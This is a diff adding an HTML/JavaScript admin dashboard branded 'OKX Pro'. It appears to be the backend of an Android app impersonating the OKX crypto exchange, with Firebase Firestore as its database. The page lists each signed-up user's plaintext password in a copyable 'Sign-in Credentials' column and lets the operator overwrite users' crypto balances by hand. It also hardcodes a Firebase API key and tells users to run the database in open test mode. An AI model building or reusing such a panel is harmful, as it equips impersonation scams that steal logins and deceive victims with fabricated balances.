@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-[#0B0B0B]">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OKX Pro — Cloud Web Admin Dashboard</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts (Space Grotesk & Inter) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        display: ['Space Grotesk', 'sans-serif'],
+                    },
+                    colors: {
+                        okxGreen: '#9FFF00', // Iconic OKX Lime Green
+                        darkCard: '#121212',
+                        darkBg: '#0B0B0B',
+                        darkBorder: '#1E1E1E'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .display-font {
+            font-family: 'Space Grotesk', sans-serif;
+        }
+    </style>
+</head>
+<body class="h-full text-white selection:bg-okxGreen selection:text-black">
+
+    <div class="min-h-full flex flex-col">
+        <!-- Top Navigation Header -->
+        <header class="bg-black border-b border-darkBorder sticky top-0 z-40">
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+                <div class="flex justify-between h-16 items-center">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-9 h-9 rounded-lg bg-okxGreen flex items-center justify-center text-black font-extrabold text-xl tracking-tighter">
+                            O
+                        </div>
+                        <div>
+                            <span class="display-font text-lg font-bold tracking-tight text-white">OKX <span class="text-okxGreen">PRO</span></span>
+                            <span class="ml-2 px-2 py-0.5 text-[10px] font-semibold bg-darkBorder text-gray-400 rounded-full border border-darkBorder">Cloud Admin</span>
+                        </div>
+                    </div>
+                    
+                    <div class="flex items-center space-x-4">
+                        <div id="connectionStatusBadge" class="flex items-center space-x-2 px-3 py-1.5 rounded-full bg-red-950/40 text-red-400 border border-red-800/60 text-xs">
+                            <span class="h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
+                            <span>DB Disconnected</span>
+                        </div>
+                        <button id="disconnectDbBtn" class="hidden text-xs text-gray-400 hover:text-white border border-darkBorder hover:bg-darkBorder px-3 py-1.5 rounded-lg transition-colors">
+                            <i class="fa-solid fa-link-slash mr-1"></i> Disconnect DB
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Workspace -->
+        <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
+            
+            <!-- Connection Wizard Panel (Shown if DB not connected) -->
+            <div id="connectionWizardPanel" class="bg-darkCard border border-darkBorder rounded-2xl p-6 sm:p-10 shadow-2xl mb-8">
+                <div class="max-w-3xl">
+                    <h2 class="display-font text-2xl sm:text-3xl font-bold text-white mb-2">Connect Your Cloud Database</h2>
+                    <p class="text-gray-400 text-sm sm:text-base mb-8">
+                        This web Admin Panel needs a database to read and update user account signups and crypto balances in real-time. We use free <strong>Firebase Firestore</strong>. Follow the instructions below to get connected in less than 2 minutes.
+                    </p>
+
+                    <!-- Instruction steps -->
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8 text-sm">
+                        <div class="bg-black/50 p-4 rounded-xl border border-darkBorder">
+                            <div class="w-7 h-7 rounded-full bg-okxGreen text-black flex items-center justify-center font-bold mb-3">1</div>
+                            <h3 class="font-semibold text-white mb-1">Create Firestore</h3>
+                            <p class="text-gray-400 text-xs leading-relaxed">
+                                Go to <a href="https://console.firebase.google.com" target="_blank" class="text-okxGreen underline hover:text-white">Firebase Console</a>, create a free project, and enable <strong>Cloud Firestore</strong> (test mode).
+                            </p>
+                        </div>
+                        <div class="bg-black/50 p-4 rounded-xl border border-darkBorder">
+                            <div class="w-7 h-7 rounded-full bg-okxGreen text-black flex items-center justify-center font-bold mb-3">2</div>
+                            <h3 class="font-semibold text-white mb-1">Add Web App</h3>
+                            <p class="text-gray-400 text-xs leading-relaxed">
+                                In Project Settings, click <strong>"Add App" (Web)</strong>. Copy the generated config values (Project ID, API Key, App ID).
+                            </p>
+                        </div>
+                        <div class="bg-black/50 p-4 rounded-xl border border-darkBorder">
+                            <div class="w-7 h-7 rounded-full bg-okxGreen text-black flex items-center justify-center font-bold mb-3">3</div>
+                            <h3 class="font-semibold text-white mb-1">Connect Here & App</h3>
+                            <p class="text-gray-400 text-xs leading-relaxed">
+                                Paste the keys below to connect. Also enter the exact same keys in your Android App's 9-dots menu sync dialog!
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Connection Form -->
+                    <form id="connectForm" class="space-y-4">
+                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Firebase Project ID</label>
+                                <input type="text" id="dbProjectId" required placeholder="e.g. okx-clone-8abc9" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-3 text-white focus:outline-none focus:border-okxGreen transition-colors text-sm">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Firebase API Key</label>
+                                <input type="password" id="dbApiKey" required placeholder="AIzaSyA4..." class="w-full bg-black border border-darkBorder rounded-xl px-4 py-3 text-white focus:outline-none focus:border-okxGreen transition-colors text-sm">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Firebase App ID</label>
+                                <input type="text" id="dbAppId" required placeholder="e.g. 1:10123:web:9f8e" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-3 text-white focus:outline-none focus:border-okxGreen transition-colors text-sm">
+                            </div>
+                        </div>
+                        
+                        <div class="pt-4 flex justify-end">
+                            <button type="submit" class="bg-okxGreen text-black font-bold px-6 py-3 rounded-xl hover:bg-white transition-colors flex items-center space-x-2">
+                                <i class="fa-solid fa-circle-nodes"></i>
+                                <span>Connect Cloud Database</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Active Connected Dashboard (Hidden by default until connected) -->
+            <div id="dashboardContainer" class="hidden space-y-8">
+                
+                <!-- Summary Metrics Bar -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                    <div class="bg-darkCard border border-darkBorder rounded-2xl p-5 flex items-center space-x-4">
+                        <div class="p-3.5 bg-okxGreen/10 rounded-xl text-okxGreen">
+                            <i class="fa-solid fa-users text-2xl"></i>
+                        </div>
+                        <div>
+                            <span class="block text-xs text-gray-400 font-medium">Total Registered Users</span>
+                            <span id="metricTotalUsers" class="display-font text-2xl font-bold">0</span>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-darkCard border border-darkBorder rounded-2xl p-5 flex items-center space-x-4">
+                        <div class="p-3.5 bg-blue-500/10 rounded-xl text-blue-400">
+                            <i class="fa-solid fa-sack-dollar text-2xl"></i>
+                        </div>
+                        <div>
+                            <span class="block text-xs text-gray-400 font-medium">Est. Global Balance</span>
+                            <span id="metricGlobalBalance" class="display-font text-2xl font-bold">$0.00</span>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-darkCard border border-darkBorder rounded-2xl p-5 flex items-center space-x-4">
+                        <div class="p-3.5 bg-amber-500/10 rounded-xl text-amber-400">
+                            <i class="fa-brands fa-btc text-2xl"></i>
+                        </div>
+                        <div>
+                            <span class="block text-xs text-gray-400 font-medium">Live BTC Ticker</span>
+                            <span id="tickerBtcPrice" class="display-font text-2xl font-bold text-amber-400">$...</span>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-darkCard border border-darkBorder rounded-2xl p-5 flex items-center space-x-4">
+                        <div class="p-3.5 bg-purple-500/10 rounded-xl text-purple-400">
+                            <i class="fa-brands fa-ethereum text-2xl"></i>
+                        </div>
+                        <div>
+                            <span class="block text-xs text-gray-400 font-medium">Live ETH Ticker</span>
+                            <span id="tickerEthPrice" class="display-font text-2xl font-bold text-purple-400">$...</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Users Directory Section -->
+                <div class="bg-darkCard border border-darkBorder rounded-2xl shadow-lg overflow-hidden">
+                    <!-- Section Header -->
+                    <div class="p-6 border-b border-darkBorder sm:flex sm:items-center sm:justify-between space-y-4 sm:space-y-0">
+                        <div>
+                            <h2 class="display-font text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fa-solid fa-address-book text-okxGreen text-lg"></i>
+                                <span>Users Directory</span>
+                            </h2>
+                            <p class="text-gray-400 text-xs mt-1">Real-time database records linked to user mobile applications</p>
+                        </div>
+                        
+                        <div class="flex items-center space-x-3">
+                            <div class="relative">
+                                <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-400">
+                                    <i class="fa-solid fa-magnifying-glass text-xs"></i>
+                                </span>
+                                <input type="text" id="userSearchInput" placeholder="Search by email, name..." class="bg-black border border-darkBorder rounded-lg pl-9 pr-4 py-2 text-white focus:outline-none focus:border-okxGreen text-xs w-60 transition-all">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Database Table -->
+                    <div class="overflow-x-auto">
+                        <table class="min-w-full divide-y divide-darkBorder text-sm">
+                            <thead class="bg-black/40 text-gray-400 text-xs uppercase tracking-wider text-left font-semibold">
+                                <tr>
+                                    <th class="px-6 py-4">User Profile</th>
+                                    <th class="px-6 py-4">Sign-in Credentials</th>
+                                    <th class="px-6 py-4">Primary Balances</th>
+                                    <th class="px-6 py-4">Est. Value (USD)</th>
+                                    <th class="px-6 py-4">Last Synced</th>
+                                    <th class="px-6 py-4 text-right">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="usersTableBody" class="divide-y divide-darkBorder bg-darkCard/20">
+                                <!-- Loaded dynamically -->
+                                <tr>
+                                    <td colspan="6" class="px-6 py-12 text-center text-gray-400 text-xs">
+                                        <i class="fa-solid fa-circle-notch animate-spin text-lg text-okxGreen mb-2 block mx-auto"></i>
+                                        Syncing cloud database records...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <!-- Footer -->
+        <footer class="bg-black border-t border-darkBorder py-6 text-center text-xs text-gray-500 mt-auto">
+            <div class="max-w-7xl mx-auto px-4">
+                <p class="mb-2">OKX Pro Web Admin Console &copy; 2026. All Rights Reserved.</p>
+                <p>Deployable on Netlify with client-side local persistence securely managed.</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Edit User Balances Modal Dialog -->
+    <div id="editBalancesModal" class="hidden fixed inset-0 z-50 overflow-y-auto" role="dialog" aria-modal="true">
+        <!-- Backdrop -->
+        <div class="fixed inset-0 bg-black/80 backdrop-blur-sm transition-opacity"></div>
+
+        <!-- Panel container -->
+        <div class="flex min-h-full items-end justify-center p-4 text-center sm:items-center sm:p-0">
+            <div class="relative transform overflow-hidden rounded-2xl bg-darkCard border border-darkBorder text-left shadow-2xl transition-all sm:my-8 sm:w-full sm:max-w-xl">
+                <!-- Header -->
+                <div class="bg-black/30 px-6 py-4 border-b border-darkBorder flex justify-between items-center">
+                    <div>
+                        <h3 class="display-font text-lg font-bold text-white flex items-center space-x-2">
+                            <i class="fa-solid fa-pen-to-square text-okxGreen"></i>
+                            <span>Adjust User Balances</span>
+                        </h3>
+                        <p id="editBalancesSubtitle" class="text-xs text-gray-400 mt-0.5">user@example.com</p>
+                    </div>
+                    <button type="button" class="closeModalBtn text-gray-400 hover:text-white text-lg transition-colors">
+                        <i class="fa-solid fa-xmark"></i>
+                    </button>
+                </div>
+
+                <!-- Body (List of input assets) -->
+                <form id="editBalancesForm">
+                    <input type="hidden" id="editBalancesEmail">
+                    
+                    <div class="px-6 py-4 max-h-[60vh] overflow-y-auto space-y-4">
+                        <div class="grid grid-cols-2 gap-4">
+                            <!-- SOL -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>Solana (SOL)</span>
+                                    <span id="current_SOL" class="text-[10px] text-okxGreen font-mono">0.00</span>
+                                </label>
+                                <div class="relative">
+                                    <input type="number" step="any" id="balance_SOL" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                                </div>
+                            </div>
+                            <!-- USDT -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>Tether (USDT)</span>
+                                    <span id="current_USDT" class="text-[10px] text-okxGreen font-mono">0.00</span>
+                                </label>
+                                <input type="number" step="any" id="balance_USDT" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                            </div>
+                            <!-- BTC -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>Bitcoin (BTC)</span>
+                                    <span id="current_BTC" class="text-[10px] text-okxGreen font-mono">0.0000</span>
+                                </label>
+                                <input type="number" step="any" id="balance_BTC" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                            </div>
+                            <!-- ETH -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>Ethereum (ETH)</span>
+                                    <span id="current_ETH" class="text-[10px] text-okxGreen font-mono">0.0000</span>
+                                </label>
+                                <input type="number" step="any" id="balance_ETH" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                            </div>
+                            <!-- BNB -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>BNB Coin (BNB)</span>
+                                    <span id="current_BNB" class="text-[10px] text-okxGreen font-mono">0.00</span>
+                                </label>
+                                <input type="number" step="any" id="balance_BNB" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                            </div>
+                            <!-- TRX -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>TRON (TRX)</span>
+                                    <span id="current_TRX" class="text-[10px] text-okxGreen font-mono">0.00</span>
+                                </label>
+                                <input type="number" step="any" id="balance_TRX" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                            </div>
+                            <!-- USDG -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>USDG Token</span>
+                                    <span id="current_USDG" class="text-[10px] text-okxGreen font-mono">0.00</span>
+                                </label>
+                                <input type="number" step="any" id="balance_USDG" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                            </div>
+                            <!-- USDC -->
+                            <div>
+                                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1.5 flex items-center justify-between">
+                                    <span>USD Coin (USDC)</span>
+                                    <span id="current_USDC" class="text-[10px] text-okxGreen font-mono">0.00</span>
+                                </label>
+                                <input type="number" step="any" id="balance_USDC" class="w-full bg-black border border-darkBorder rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-okxGreen">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Actions Footer -->
+                    <div class="bg-black/20 border-t border-darkBorder px-6 py-4 flex justify-end space-x-3">
+                        <button type="button" class="closeModalBtn text-xs text-gray-400 hover:text-white font-semibold px-4 py-2.5 rounded-lg border border-darkBorder transition-colors">
+                            Cancel
+                        </button>
+                        <button type="submit" class="bg-okxGreen text-black text-xs font-bold px-5 py-2.5 rounded-lg hover:bg-white transition-colors">
+                            Save Balances
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK Scripts -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, onSnapshot, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // Local state
+        let db = null;
+        let firebaseApp = null;
+        let unsubscribeUsers = null;
+        let usersData = [];
+        let coinPrices = {
+            "USDT": 1.0, "USDC": 1.0, "USDG": 1.0,
+            "BTC": 63400.0, "ETH": 3450.0, "BNB": 580.0,
+            "SOL": 145.5, "TRX": 0.12, "1INCH": 0.40, "XAUT": 2410.0
+        };
+
+        // DOM elements
+        const wizardPanel = document.getElementById('connectionWizardPanel');
+        const dashboard = document.getElementById('dashboardContainer');
+        const badge = document.getElementById('connectionStatusBadge');
+        const disconnectBtn = document.getElementById('disconnectDbBtn');
+        const tableBody = document.getElementById('usersTableBody');
+        const searchInput = document.getElementById('userSearchInput');
+        const modal = document.getElementById('editBalancesModal');
+
+        // Initial setup check
+        document.addEventListener('DOMContentLoaded', () => {
+            fetchLivePrices();
+            const savedConfig = localStorage.getItem('okx_db_config');
+            if (savedConfig) {
+                const config = JSON.parse(savedConfig);
+                connectToFirebase(config.projectId, config.apiKey, config.appId);
+            } else {
+                // Connect automatically to the pre-loaded default project settings
+                const defaultProjectId = "adorable-8e40c";
+                const defaultApiKey = "AIzaSyDOFPOzXZNcPNx9SM-MSMOpyRSfmLhHC1o";
+                const defaultAppId = "1:1004621666717:android:940450615c374d4bf17774";
+                connectToFirebase(defaultProjectId, defaultApiKey, defaultAppId);
+            }
+        });
+
+        // Connection submit
+        document.getElementById('connectForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const projectId = document.getElementById('dbProjectId').value.trim();
+            const apiKey = document.getElementById('dbApiKey').value.trim();
+            const appId = document.getElementById('dbAppId').value.trim();
+            
+            if(connectToFirebase(projectId, apiKey, appId)) {
+                localStorage.setItem('okx_db_config', JSON.stringify({ projectId, apiKey, appId }));
+            }
+        });
+
+        // Disconnect DB
+        disconnectBtn.addEventListener('click', () => {
+            localStorage.removeItem('okx_db_config');
+            if (unsubscribeUsers) unsubscribeUsers();
+            db = null;
+            firebaseApp = null;
+            
+            // UI Toggle
+            wizardPanel.classList.remove('hidden');
+            dashboard.classList.add('hidden');
+            disconnectBtn.classList.add('hidden');
+            
+            badge.innerHTML = `<span class="h-2 w-2 rounded-full bg-red-500 animate-pulse"></span><span>DB Disconnected</span>`;
+            badge.className = "flex items-center space-x-2 px-3 py-1.5 rounded-full bg-red-950/40 text-red-400 border border-red-800/60 text-xs";
+        });
+
+        // Search input logic
+        searchInput.addEventListener('input', () => {
+            renderTable();
+        });
+
+        // Modal triggers
+        document.querySelectorAll('.closeModalBtn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                modal.classList.add('hidden');
+            });
+        });
+
+        // Edit balances form submit
+        document.getElementById('editBalancesForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('editBalancesEmail').value;
+            if (!db || !email) return;
+
+            const updatedBalances = {
+                "SOL": parseFloat(document.getElementById('balance_SOL').value) || 0.0,
+                "USDT": parseFloat(document.getElementById('balance_USDT').value) || 0.0,
+                "BTC": parseFloat(document.getElementById('balance_BTC').value) || 0.0,
+                "ETH": parseFloat(document.getElementById('balance_ETH').value) || 0.0,
+                "BNB": parseFloat(document.getElementById('balance_BNB').value) || 0.0,
+                "TRX": parseFloat(document.getElementById('balance_TRX').value) || 0.0,
+                "USDG": parseFloat(document.getElementById('balance_USDG').value) || 0.0,
+                "USDC": parseFloat(document.getElementById('balance_USDC').value) || 0.0
+            };
+
+            try {
+                const userDocRef = doc(db, "users", email.toLowerCase());
+                await updateDoc(userDocRef, {
+                    balances: updatedBalances,
+                    lastUpdated: Date.now()
+                });
+                modal.classList.add('hidden');
+                showNotification(`Success: Balances updated for ${email}`, "success");
+            } catch (error) {
+                console.error("Error saving balances to Firebase:", error);
+                alert("Could not update database document: " + error.message);
+            }
+        });
+
+        // Fetch Cryptocompare price rates for accurate preview metrics
+        async function fetchLivePrices() {
+            try {
+                const res = await fetch("https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,BNB,SOL,USDT,TRX,1INCH,XAUT,USDG,USDC&tsyms=USD");
+                if (res.ok) {
+                    const data = await res.json();
+                    for (const coin in data) {
+                        if (data[coin] && data[coin].USD) {
+                            coinPrices[coin] = data[coin].USD;
+                        }
+                    }
+                    // Update tickers
+                    document.getElementById('tickerBtcPrice').innerText = `$${Math.round(coinPrices.BTC).toLocaleString()}`;
+                    document.getElementById('tickerEthPrice').innerText = `$${Math.round(coinPrices.ETH).toLocaleString()}`;
+                }
+            } catch (err) {
+                console.error("Live ticker price fetch failed", err);
+            }
+        }
+
+        // Connect Firebase API dynamically
+        function connectToFirebase(projectId, apiKey, appId) {
+            try {
+                const firebaseConfig = {
+                    apiKey: apiKey,
+                    authDomain: `${projectId}.firebaseapp.com`,
+                    projectId: projectId,
+                    storageBucket: `${projectId}.appspot.com`,
+                    appId: appId
+                };
+                
+                firebaseApp = initializeApp(firebaseConfig);
+                db = getFirestore(firebaseApp);
+                
+                // Set badge UI
+                badge.innerHTML = `<span class="h-2 w-2 rounded-full bg-okxGreen animate-pulse"></span><span>Connected to ${projectId}</span>`;
+                badge.className = "flex items-center space-x-2 px-3 py-1.5 rounded-full bg-emerald-950/40 text-okxGreen border border-emerald-800/60 text-xs";
+                
+                // Show panels
+                wizardPanel.classList.add('hidden');
+                dashboard.classList.remove('hidden');
+                disconnectBtn.classList.remove('hidden');
+                
+                // Start subscribing to Firebase changes
+                listenToUsers();
+                return true;
+            } catch (err) {
+                console.error("Firebase startup crash:", err);
+                alert("Database Connection Error: " + err.message);
+                return false;
+            }
+        }
+
+        // Subscribe to real-time Users collection
+        function listenToUsers() {
+            if (!db) return;
+            
+            const usersRef = collection(db, "users");
+            unsubscribeUsers = onSnapshot(usersRef, (snapshot) => {
+                usersData = [];
+                snapshot.forEach((doc) => {
+                    usersData.push({ id: doc.id, ...doc.data() });
+                });
+                
+                // Render metrics and table
+                updateMetrics();
+                renderTable();
+            }, (err) => {
+                console.error("Firestore sync listener error:", err);
+                tableBody.innerHTML = `<tr><td colspan="6" class="px-6 py-8 text-center text-red-400 text-xs">Error reading Firebase Database collection. Check security rules inside Firebase console.</td></tr>`;
+            });
+        }
+
+        // Calculate and display metrics
+        function updateMetrics() {
+            document.getElementById('metricTotalUsers').innerText = usersData.length;
+            
+            let globalTotal = 0.0;
+            usersData.forEach(user => {
+                if (user.balances) {
+                    for (const coin in user.balances) {
+                        const amt = parseFloat(user.balances[coin]) || 0.0;
+                        const price = coinPrices[coin.toUpperCase()] || 0.0;
+                        globalTotal += amt * price;
+                    }
+                }
+            });
+            document.getElementById('metricGlobalBalance').innerText = `$${globalTotal.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+        }
+
+        // Render dynamic table rows
+        function renderTable() {
+            const query = searchInput.value.toLowerCase().trim();
+            const filtered = usersData.filter(user => {
+                return (user.email && user.email.toLowerCase().includes(query)) ||
+                       (user.username && user.username.toLowerCase().includes(query));
+            });
+            
+            if (filtered.length === 0) {
+                tableBody.innerHTML = `<tr><td colspan="6" class="px-6 py-12 text-center text-gray-500 text-xs">No user database records found. When users register in the Android App, they will appear here instantly!</td></tr>`;
+                return;
+            }
+
+            tableBody.innerHTML = '';
+            filtered.forEach(user => {
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-white/[0.02] transition-colors";
+                
+                // Estimate user balance value
+                let userUsdValue = 0.0;
+                let balanceOverviewStr = [];
+                
+                if (user.balances) {
+                    for (const coin in user.balances) {
+                        const amount = parseFloat(user.balances[coin]) || 0.0;
+                        if (amount > 0) {
+                            const coinPrice = coinPrices[coin.toUpperCase()] || 0.0;
+                            userUsdValue += amount * coinPrice;
+                            balanceOverviewStr.push(`${amount.toFixed(4)} ${coin}`);
+                        }
+                    }
+                }
+                
+                const balanceStringHtml = balanceOverviewStr.length > 0 
+                    ? balanceOverviewStr.slice(0, 3).map(b => `<span class="inline-block bg-darkBorder text-gray-300 px-2 py-0.5 rounded text-[11px] font-mono mr-1 mb-1">${b}</span>`).join('')
+                    : `<span class="text-gray-500 italic text-xs">No active assets</span>`;
+
+                const formattedDate = user.lastUpdated 
+                    ? new Date(user.lastUpdated).toLocaleString() 
+                    : "Never";
+
+                tr.innerHTML = `
+                    <td class="px-6 py-4 whitespace-nowrap">
+                        <div class="flex items-center space-x-3">
+                            <div class="w-8 h-8 rounded-full bg-gradient-to-br from-okxGreen to-emerald-800 text-black font-bold flex items-center justify-center text-xs uppercase">
+                                ${(user.username || "U").substring(0, 2)}
+                            </div>
+                            <div>
+                                <span class="block text-white font-semibold text-xs">${user.username || "Unknown User"}</span>
+                                <span class="block text-gray-500 text-[10px]">${user.email || "No email"}</span>
+                            </div>
+                        </div>
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap">
+                        <span class="block text-gray-400 text-xs font-mono select-all select-none hover:text-white transition-colors cursor-pointer" title="Click to view/copy password">
+                            <i class="fa-solid fa-key mr-1.5 text-gray-600"></i> ${user.password || "••••••••"}
+                        </span>
+                    </td>
+                    <td class="px-6 py-4">
+                        <div class="flex flex-wrap max-w-xs">${balanceStringHtml}</div>
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap text-xs font-bold ${userUsdValue > 0 ? "text-okxGreen" : "text-white"} font-mono">
+                        $${userUsdValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap text-gray-500 text-xs font-mono">
+                        ${formattedDate}
+                    </td>
+                    <td class="px-6 py-4 whitespace-nowrap text-right">
+                        <button onclick="openEditBalances('${user.email}')" class="bg-darkBorder hover:bg-okxGreen hover:text-black text-gray-300 text-xs px-3.5 py-1.5 rounded-lg border border-darkBorder hover:border-okxGreen transition-all font-semibold">
+                            <i class="fa-solid fa-coins mr-1"></i> Edit Balances
+                        </button>
+                    </td>
+                `;
+                tableBody.appendChild(tr);
+            });
+        }
+
+        // Open edit balances dialog
+        window.openEditBalances = function(email) {
+            const user = usersData.find(u => u.email === email);
+            if (!user) return;
+
+            document.getElementById('editBalancesEmail').value = user.email;
+            document.getElementById('editBalancesSubtitle').innerText = `${user.username || "User"} (${user.email})`;
+            
+            // Set current balance helpers
+            const coins = ["SOL", "USDT", "BTC", "ETH", "BNB", "TRX", "USDG", "USDC"];
+            coins.forEach(coin => {
+                const balanceVal = user.balances && user.balances[coin] !== undefined ? parseFloat(user.balances[coin]) : 0.0;
+                document.getElementById(`current_${coin}`).innerText = balanceVal.toFixed(4);
+                document.getElementById(`balance_${coin}`).value = balanceVal > 0 ? balanceVal : '';
+            });
+
+            modal.classList.remove('hidden');
+        }
+
+        // Notification Helper
+        function showNotification(text, type = "success") {
+            const div = document.createElement('div');
+            div.className = `fixed bottom-5 right-5 z-50 px-5 py-3.5 rounded-xl shadow-2xl transition-all border text-xs font-bold flex items-center space-x-2 ${
+                type === "success" 
+                    ? "bg-emerald-950 text-okxGreen border-emerald-800" 
+                    : "bg-red-950 text-red-400 border-red-800"
+            }`;
+            div.innerHTML = `<i class="fa-solid ${type === 'success' ? 'fa-circle-check' : 'fa-circle-exclamation'}"></i><span>${text}</span>`;
+            document.body.appendChild(div);
+            setTimeout(() => {
+                div.classList.add('opacity-0', 'translate-y-2');
+                setTimeout(() => div.remove(), 500);
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
